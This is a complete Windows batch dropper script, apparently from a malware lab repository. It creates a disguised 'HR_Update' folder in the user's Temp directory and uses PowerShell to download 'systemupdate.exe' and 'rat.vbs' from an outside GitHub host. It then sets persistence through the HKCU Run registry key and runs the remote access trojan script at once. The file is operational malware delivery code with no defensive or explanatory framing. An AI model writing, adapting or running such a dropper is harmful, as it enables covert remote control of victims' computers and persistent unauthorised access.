@echo off
:: Use dynamic user profile directory (no need to hard-code username)
set "payloadFolder=%USERPROFILE%\AppData\Local\Temp\HR_Update"
mkdir "%payloadFolder%"

:: Attempt to download with PowerShell
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe -OutFile '%payloadFolder%\systemupdate.exe'"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs -OutFile '%payloadFolder%\rat.vbs'"

:: Check if the files exist and ensure they're downloaded
if not exist "%payloadFolder%\systemupdate.exe" (
    echo Failed to download systemupdate.exe
    exit /b
)

if not exist "%payloadFolder%\rat.vbs" (
    echo Failed to download rat.vbs
    exit /b
)

:: Add to startup (for persistence)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v HR_Update /t REG_SZ /d "%payloadFolder%\rat.vbs" /f

:: Run the VBS payload immediately
cscript "%payloadFolder%\rat.vbs"
